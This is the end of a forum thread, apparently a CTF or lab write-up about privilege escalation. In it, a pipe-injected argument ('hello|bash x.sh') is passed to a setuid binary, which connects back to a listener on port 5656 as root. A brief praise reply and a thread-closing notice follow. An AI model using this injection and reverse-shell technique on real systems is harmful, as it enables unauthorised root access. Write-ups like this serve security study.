<p><img src="../../uploads/default/original/2X/f/fc730a2b49b774fd6fb481b7751723ff4e0842a6.png" alt data-base62-sha1="A1gNedUX9jQeJcsK6o8TLZp8pT0" width="672" height="181"></p>
<p>without forgetting to start listening on port 5656</p>
<p>after all of that we run this command :</p>
<blockquote>
<p>./update_cloudav “hello|bash x.sh”</p>
</blockquote>
<p>Automatically the bin file will set the GID/UID to 0 which means if the bash x.sh commands run we are root</p>
<p>going back to our listener we have a successfully connection … and we are R00T <img src="../../images/emoji/twitter/smiley.png%3Fv=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
<p><img src="../../uploads/default/original/2X/8/873dacc18914603fa1fb01310893ba64081b7ee3.png" alt data-base62-sha1="jioAXS1HjeZw5SGuolNMfoKdvhh" width="644" height="132"></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="4" />
<span class="post-likes">4 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_2" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/exploit"><span itemprop="name">exploit</span></a>
(exploit)
</span>
<link itemprop="mainEntityOfPage" href="20360.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2020-04-08T16:58:34Z" class="post-time">
April 8, 2020, 4:58pm
</time>
<meta itemprop="dateModified" content="2020-04-08T16:58:34Z">
<span itemprop="position">2</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Good writeup man <img src="../../images/emoji/twitter/smiley.png%3Fv=9" title=":smiley:" class="emoji" alt=":smiley:"><br>
Keep going!</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_3" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/system"><span itemprop="name">system</span></a>
(system)
Closed
</span>
<link itemprop="mainEntityOfPage" href="20360.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2020-08-08T08:32:07Z" class="post-time">
August 8, 2020, 8:32am
</time>
<meta itemprop="dateModified" content="2020-08-08T08:32:07Z">
<span itemprop="position">3</span>
</span>
</div>
<div class="post" itemprop="text">
<p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
</div>
</div>
<footer class="container wrap">
<nav class="crawler-nav">
<ul>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../index.html" itemprop="url">Home </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../categories.html" itemprop="url">Categories </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="https://0x00sec.org/guidelines" itemprop="url">FAQ/Guidelines </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../tos.html" itemprop="url">Terms of Service </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../privacy.html" itemprop="url">Privacy Policy </a>
</span>
</li>
</ul>
</nav>
<p class="powered-by-link">Powered by <a href="https://www.discourse.org">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>
<script src="https://instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
</body>
</html>
